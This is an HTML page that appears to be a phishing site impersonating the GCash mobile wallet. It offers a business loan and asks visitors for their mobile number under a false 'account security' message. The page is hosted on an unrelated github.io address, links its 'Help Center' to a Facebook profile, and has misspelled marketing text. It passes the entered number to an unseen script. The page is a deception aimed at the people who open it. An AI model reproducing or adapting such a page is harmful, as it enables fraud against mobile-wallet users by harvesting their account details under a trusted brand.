<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apply now and get your offer approved</title>
    <link rel="apple-touch-icon" sizes="180x180" href="../apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="../favicon-16x16.png">
    <link rel="manifest" href="../site.webmanifest">

    <meta name="title" content="Gcash Loan Application Center | &amp; Register Your Data">
    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
    <meta name="description" content="&quot; The best loan facitlity you can get in the philipinnes">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Boost Your Business With Easy Loan">
    <meta property="og:url" content="https://gcash-loan-offer.github.io/gcash/loan/">
    <meta property="og:site_name" content="With ourr loan offers, your business is about to get better">
    <meta property="og:image" content="https://gcash-loan-offer.github.io/gcash/images/gcash-logo/gcash-1920by1920.jpg">

    <link rel="stylesheet" href="../css/loan.css">
    <link rel="stylesheet" href="../css/general-container.css">
    <link rel="stylesheet" href="../css/fontawesome/free/css/fontawesome.css">
    <link rel="stylesheet" href="../css/fontawesome/free/css/brands.css">
    <link rel="stylesheet" href="../css/fontawesome/free/css/regular.css">
    <link rel="stylesheet" href="../css/fontawesome/free/css/solid.css">
    <script src="../javascript/loan.js" defer></script>
</head>
<body class="body">
    <div class="general-container">
        <div class="elementor-inner-wrap flex-column-space-between">
            <div class="flex-element-one">
                <header>
                    <div class="nav">
                        <img src="../images/gcash-logo/gcash-logo.png" alt="Gcash logo image">
                    </div>
                </header>
                <div class="home-section">
                    <div class="elementor-account-setup-guide elementor-mtop20">
                        <div class="elementor-account-flex-box">
                            <div class="elementor-account-flex-box-left">
                                <h2>Your account, even more secure</h2>
                                <p class="elementor-mtop5">Para mas Gsafe ka, register your phone para ikaw lang ang pwedeng maka-access
                                    ng account mo.
                                </p>
                                <p class="elementor-mtop10">Have more than one phone? Create a new account for easy access.</p>
                            </div>
                            <div class="elementor-account-flex-box-right">
                                <i class="fa-solid fa-triangle-exclamation"></i>
                            </div>
                        </div>
                    </div>
                    <div class="elementor-mtop10 elementor-text-align">
                        <p class="elementor-put-your-number-p">Put your mobile number to get started</p>
                    </div>
                    <div class="elementor-mobile-number-input elementor-mtop10">
                        <div>
                            <label for="number-prefix" aria-label="Phone number-prefix"></label>
                            <input type="text" name="tel-number-prefix" id="number-prefix" value="+1" readonly class="elementor-input-readonly">
                        </div>
                        <div>
                            <i class="fa-solid fa-angle-down"></i>
                        </div>
                        <div>
                            <label for="number-suffix" aria-label="Phone-number-suffix"></label>
                            <input type="tel" name="tel-number-suffix" id="number-suffix" onfocus="wipeError()" pattern="[0-9]{3} [0-9]{3} [0-9]{4}" maxlength="12" placeholder="123 456 7890" class="elementor-input-number">
                        </div>
                    </div>
                    <p class="error-msg elementor-mtop10"></p>
                </div>
            </div>

            <div class="flex-element-two">
                <div class="input-submit-buttons elementor-center-flex">
                    <button type="button" onclick="validateForm();" class="submit-button">Apply now</button>
                    <button type="button" class="spinner-button hide-display">
                        <div class="spin-div"></div>Please wait..
                    </button>
                </div>
                <footer class="elementor-mtop40 elementor-text-align">
                    <h6 class="elementor-help-center"><a href="https://www.facebook.com/profile.php?id=61556834963083">Help Center</a></h6>
                    <p class="elementor-mtop10 elementor-pv5">v5.73.1:865</p>
                </footer>
            </div>
        </div>
    </div>
</body>
</html>
